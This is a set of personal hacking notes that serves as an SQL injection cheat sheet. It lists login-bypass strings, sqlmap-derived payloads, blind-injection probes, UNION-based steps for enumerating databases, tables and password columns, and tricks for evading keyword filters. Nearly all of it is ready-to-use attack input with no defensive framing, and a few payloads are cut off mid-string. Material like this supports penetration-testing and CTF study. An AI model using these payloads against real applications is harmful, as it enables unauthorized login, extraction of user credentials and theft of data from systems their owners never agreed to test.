---
tags: 🔻 🔻/Enumeration sqlinjection
aliases: Hacking Notes
---

# Login Bypass

## Login bypass  
#sqlinjection 

meh' OR 3=3;#  
meh' OR 2=2 LIMIT 1;#  
meh' OR 'a'='a  
meh' OR 1=1 --+  
  
  
param='  
param="  
param=' or 1=1  
param=' or 1=0  
param=' and 1=1  
' or sleep(2) and 1=1#  
' or sleep(2)#  
admin' and sleep(2)#  
' union select sleep(2),null#  
' union select sleep(2),null,null,null,null#  
param=' or 1=1#  
param=' or 1=1  
param=' or 1=1 //  
param= or 1=1#  
param=and or 1=1#  
param=' or 1=1  
  

## This is the most classic, standard first test:
#sqlinjection
 
' or '1'='1  
  
Then you have:  
\-'  
' '  
'&'  
'^'  
'\*'  
' or ''-'  
' or '' '  
' or ''&'  
' or ''^'  
' or ''\*'  
"-"  
" "  
"&"  
"^"  
"\*"  
" or ""-"  
" or "" "  
" or ""&"  
" or ""^"  
" or ""\*"  
or true--  
" or true--  
' or true--  
") or true--  
') or true--  
' or 'x'='x  
') or ('x')=('x  
')) or (('x'))=(('x  
" or "x"="x  
") or ("x")=("x  
")) or (("x"))=(("x

  
  

## If above queries don't work try with these sqlmap payoads:
#sqlinjection #sqlmap 
  
'.)))("),.  
'ghwshP<'">CZuifw  
)+AND+4287=8913+AND+(7303=7303  
)+AND+8680=8680+AND+(6351=6351  
+AND+4573=5119  
+AND+8680=8680  
')+AND+9284=3986+AND+('ndfW'='ndfW  
')+AND+8680=8680+AND+('juwu'='juwu  
+AND+2138=DBMS\_PIPE.RECEIVE\_MESSAGE(CHR(83)||CHR(x.x.x.x  
')+AND+2138=DBMS\_PIPE.RECEIVE\_MESSAGE(CHR(83)||CHR(x.x.x.x  
(SELECT+3273+FROM(SELECT+COUNT(\*),CONCAT(0x716a6a7671,(SELECT+(ELT(3273=3273,1))),0x716b717071,FLOOR(RAND(0)\*2))x+FROM+INFORMATION\_SCHEMA.PLUGINS+GROUP+BY+x)a)  
(SELECT+CONCAT(0x716a6a7671,(SELECT+(ELT(6967=6967,1))),0x716b717071))  
+AND+4920=(SELECT+UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(x.x.x.x  
)+AND+7244=4397+AND+(3968=3968  
)+AND+6379=6379+AND+(1483=1483  
')+AND+2572=3816+AND+('alWa'='alWa  
')+AND+6379=6379+AND+('mxeB'='mxeB  
)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+tsVj  
+ORDER+BY+1--+UCdp  
+UNION+ALL+SELECT+NULL--+UzBg  
+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+ISdf  
')+ORDER+BY+8048--+qQkS  
')+UNION+ALL+SELECT+NULL--+TFas  
')+UNION+ALL+SELECT+NULL,NULL--+EZcP  
%'+ORDER+BY+1--+NSgg  
%'+ORDER+BY+7605--+dZkK  
%'+UNION+ALL+SELECT+NULL--+JQPp  
%'+UNION+ALL+SELECT+NULL,NULL--+VtSC  
+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+Lbrh  
' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6b6271,IFNULL(CAST(table\_name AS CHAR),0x20),0x7162627671),NULL,NULL FROM INFORMATION\_SCHEMA.TABLES-- sd  
  

## If nothing works try these Blind sql payloads:
#blindsql
  
  
' AND (select 1)=1  
Guessing Table name:  
' AND (select 1 from admin limit 0,1)=1  
' AND (select 1 from users limit 0,1)=1  

## Guessing Columns:

  
' AND (select substring(concat(1,pass),1,1) from users limit 0,1)=1  
' AND (select substring(concat(1,password),1,1) from users limit 0,1)=  
  

## Now determine number of columns in the current table  

  
param=' or 1=1 order by 1#  
  
param=' or 1=1 order by x.x.x.x  
  
let say there are 3 columns  
  

## Now determine vulnerable columns or column which is visible

  
  
param=' or 1=0 union select null,null,null# --> if it produces no error then try  
  
param=' or 1=0 union select 1,2,3# --> check which number shows in web page  
  

## Else try

  
  
param=' or 1=1 union select table\_name,null,null from information\_schema.tables#  
  
if it produces error try table\_name at other positions  
  
Now, lets say column 1,2 are shown in web page  
  

## To futher enumerate

  
  
param=' or 1=0 union select table\_schema,null,null from information\_schema.columns# --> display all database name  
  
Note 1=0 in above query to show only databases  
  
param=' or 1=0 union select version(),null,null from information\_schema.columns# --> retrieve version  
  
param=' or 1=0 union select @@version,null,null from information\_schema.columns# --> retrieve version in mssql  
  
param=' or 1=0 union select substring(version(),1,1)=1,null,null from information\_schema.columns# --> return true if version is 1.x.x  
  
param=' or 1=0 union select substring(version(),1,1)=5,null,null from information\_schema.columns# --> return true if version is 5.x.x  
  
param=' or 1=0 union select substring(version(),3,1)=2,null,null from information\_schema.columns# --> return true if version is 5.2.x  
  
param=' or 1=0 union select table\_name,null,null from information\_schema.columns# --> display all table name  
  
param=' or 1=1 select table\_name,null,null from information\_schema.columns where table\_schema='public'# --> display tables inside public database  
  
param=' or 1=1 select column\_name,null,null from information\_schema.columns where table\_schema='public' and table\_name='info'# --> display all columns of info table  
  
param=' or 1=1 select table\_name as table,column\_name as column,null from information\_schema.columns#  
  

## Let say the database name is public and table name is info  
  
Let the table info has two columns id and name

  
  
param=' or 1=0 union select id,null,null from public.info# --> display id column from table "info"  
  
param=' or 1=0 union select id,name,null from public.info# --> display id and name column from table "info"  
  
param=' or 1=0 union select id,name,null from public.info where id='papa'# --> display id and name of 'papa'  
  

## BYPASSING filters

  
  
we can use case switching or commenting to bypass normal filters such as union, select  
  
param=' or 1=0 UniOn selEct id,null,null FroM public.info#  
  
param=' or 1=0 un//ion sele//ct id,null,null fr/\*\*/om public.info# works in mssql  
  
Useful Resources  
  
[http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)  
  
[http://garage4hackers.com/showthread.php?t=1990](http://garage4hackers.com/showthread.php?t=1990)